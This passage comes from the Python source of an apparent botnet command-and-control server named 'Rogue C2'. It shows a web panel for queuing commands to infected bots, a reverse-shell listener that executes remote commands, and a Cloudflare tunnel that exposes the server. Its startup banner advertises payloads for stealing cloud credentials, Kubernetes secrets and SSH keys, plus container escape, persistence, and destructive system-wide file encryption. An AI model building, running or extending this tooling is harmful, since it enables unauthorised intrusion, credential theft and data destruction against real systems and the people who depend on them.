    <td><span class="tag ${b.channel}">${esc(b.channel)}</span>${b.pending?` <span class="tag">q${b.pending}</span>`:""}</td>
    <td>${esc(b.ip)}</td><td>${esc(b.cloud)}</td><td>${b.beacons}</td><td>${b.cmds}</td>
    <td>${b.results}</td><td>${esc(b.last_seen)}</td></tr>`).join("")}
  $("peers").innerHTML = d.peers.length ? d.peers.map(p=>
    `<div class="ev"><span class="k">peer</span><span class="b">${esc(p.label)}</span>
     <span>${p.gw?'<span class="tag gw">GW</span>':""} ${p.age}s ago</span></div>`).join("")
    : '<div class="empty">no mesh peers announced</div>';
  $("events").innerHTML = d.events.length ? d.events.map(e=>
    `<div class="ev"><span class="k">${esc(e.kind)}</span><span class="b">${esc(e.bot)}</span>
     <span class="t">${e.detail?esc(e.detail):""} -${e.ts<1?"now":Math.round(e.ts)+"s"}</span></div>`).join("")
    : '<div class="empty">no activity yet</div>';
}
async function sendCmd(){
  const bot=$("cmd_bot").value, cmd=$("cmd_text").value.trim();
  if(!bot||!cmd)return toast("pick a bot and type a command");
  const r=await fetch("/command",{method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({beacon_id:bot,command:cmd})});
  const j=await r.json();
  $("cmd_out").textContent=cmd+" -> "+bot+" : "+j.status+" ("+(j.command_id||"")+")";
  $("cmd_text").value=""; toast("queued for "+bot);
}
$("cmd_text").addEventListener("keydown",e=>{if(e.key==="Enter")sendCmd()});
tick(); setInterval(tick,2500);
</script>
</body>
</html>"""

# ==================== REVERSE SHELL LISTENER ====================

def reverse_shell_listener():
    """Reverse shell listener"""
    server = socket.socket()
    server.bind(('0.0.0.0', 9001))
    server.listen(5)
    print("[REVERSE SHELL] Listening on port 9001...")
    while True:
        conn, addr = server.accept()
        print(f"[REVERSE SHELL] Connection from {addr}")
        threading.Thread(target=handle_reverse_shell, args=(conn, addr)).start()

def handle_reverse_shell(conn, addr):
    """Handle reverse shell session"""
    try:
        conn.send(b"Rogue C2 Reverse Shell - Connected\n")
        while True:
            conn.send(b"$ ")
            cmd = conn.recv(1024).decode().strip()
            if cmd.lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            conn.send(output.encode() + b"\n")
    except:
        pass
    finally:
        conn.close()
        print(f"[REVERSE SHELL] Disconnected from {addr}")

# ==================== STARTUP ====================

def start_cloudflared(port=C2_PORT):
    """Start a cloudflared quick tunnel (no account needed) and return its URL.

    Requires the cloudflared binary. URL is a random *.trycloudflare.com;
    for a fixed hostname use a named tunnel or the Cloudflare Worker fronting
    pattern in docs/TRANSPORTS.md.
    """
    import re as _re
    subprocess.run(["pkill", "-f", "cloudflared"], stderr=subprocess.DEVNULL)
    time.sleep(1)
    try:
        proc = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://localhost:%d" % port, "--no-autoupdate"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except FileNotFoundError:
        print("[!] cloudflared binary not found - install it or use ROGUE_TUNNEL=none")
        return None
    url = None
    deadline = time.time() + 25
    while time.time() < deadline:
        line = proc.stdout.readline()
        if not line:
            break
        m = _re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line)
        if m:
            url = m.group(0)
            break
    if not url:
        print("[!] cloudflared quick tunnel failed to come up")
        try:
            proc.terminate()
        except Exception:
            pass
    return url


def start_optional_tunnel(port=C2_PORT):
    """Bootstrap an outbound tunnel based on ROGUE_TUNNEL (cloudflared|none)."""
    choice = os.environ.get("ROGUE_TUNNEL", "none").strip().lower()
    if choice == "cloudflared":
        print("[*] Starting cloudflared quick tunnel (ROGUE_TUNNEL=cloudflared)...")
        return start_cloudflared(port)
    print("[*] No tunnel autostarted (ROGUE_TUNNEL=none). Point c2_hosts at a direct")
    print("    host, CDN-fronted domain, or tunnel URL - see docs/TRANSPORTS.md")
    return None

def start_payload_server():
    """Start HTTP server for payloads (optional - kept for backward compatibility)"""
    payload_path = os.path.join(os.getcwd(), "payloads")
    if not os.path.exists(payload_path):
        os.makedirs(payload_path, exist_ok=True)
        print(f"[!] Created payloads directory: {payload_path}")
        print(f"[+] Payloads will be served via Flask at /payloads/")

    # Payloads are served directly by Flask at /payloads/

def main():
    """Main startup function"""
    print("\n" + "="*60)
    print(" ROGUE C2 SERVER - Complete Command & Control")
    print("="*60)
    
    rv2c_print_banner()
    
    # Start listeners in threads
    threading.Thread(target=exfil_listener, daemon=True).start()
    print(f"[+] Exfil listener started on port {EXFIL_PORT}")
    
    threading.Thread(target=rv2c_shell_listener, daemon=True).start()
    print(f"[+] Encrypted (v2) shell listener started on port 9001")
    
    # Initialize payloads directory
    start_payload_server()
    
    # Start an outbound tunnel (optional, env-gated)
    global ACTIVE_TUNNEL_URL
    ACTIVE_TUNNEL_URL = start_optional_tunnel()
    
    if ACTIVE_TUNNEL_URL:
        hostname = ACTIVE_TUNNEL_URL.replace("https://", "").replace("http://", "").rstrip("/")
        print(f"\n[+] C2 SERVER IS LIVE!")
        print(f"[TUNNEL] C2 URL: {ACTIVE_TUNNEL_URL}")
        print(f"[TUNNEL] Hostname: {hostname}")
        print(f"[TUNNEL] Payloads: {ACTIVE_TUNNEL_URL}/payloads/")
        print(f"\n[>] Set in implant:")
        print(f"    C2_HOST = '{hostname}'")
        print(f"    C2_PORT = 443")
        print(f"    PAYLOAD_REPO = '{ACTIVE_TUNNEL_URL}/payloads/'")
    else:
        print("[!] Tunnel failed. Using localhost.")
        print(f"[>] Local C2: http://localhost:{C2_PORT}")
        print(f"[>] Local Payloads: http://localhost:{C2_PORT}/payloads/")
    
    print(f"\n[ADMIN] Web Panel: http://localhost:{C2_PORT}/admin")
    print(f"[EXFIL] Listener: 0.0.0.0:{EXFIL_PORT}")
    print(f"[SHELL] Reverse Shell: 0.0.0.0:9001")
    print(f"[PAYLOADS] Available at: {ACTIVE_TUNNEL_URL}/payloads/" if ACTIVE_TUNNEL_URL else f"[PAYLOADS] Available at: http://localhost:{C2_PORT}/payloads/")
    print(f"[ADVANCED] 4 New Payloads Added: Process Injection, File Hider, Cron Persist, Competitor Cleaner")
    print(f"[CLOUD] 5 Cloud Payloads Added: Cloud Detector, AWS/Azure/GCP Stealers, Container Escape")
    print(f"[KUBERNETES] 1 New Payload Added: k8s_secret_stealer.py")
    print(f"[FILE ENCRYPTION] System-wide modes: system_test, system_user, system_aggressive, system_destructive")
    print(f"\n[K8S FEATURES]")
    print(f"  • Complete secret extraction from all namespaces")
    print(f"  • Targeted secret stealing by namespace")
    print(f"  • Service account token harvesting")
    print(f"  • TLS certificate extraction")
    print(f"  • ConfigMap collection")
    print(f"  • SSH key harvesting from pods")
    print("\n" + "="*60)
    
    # Start Flask server
    app.run(host='0.0.0.0', port=C2_PORT, debug=False, threaded=True)

if __name__ == "__main__":
    main()
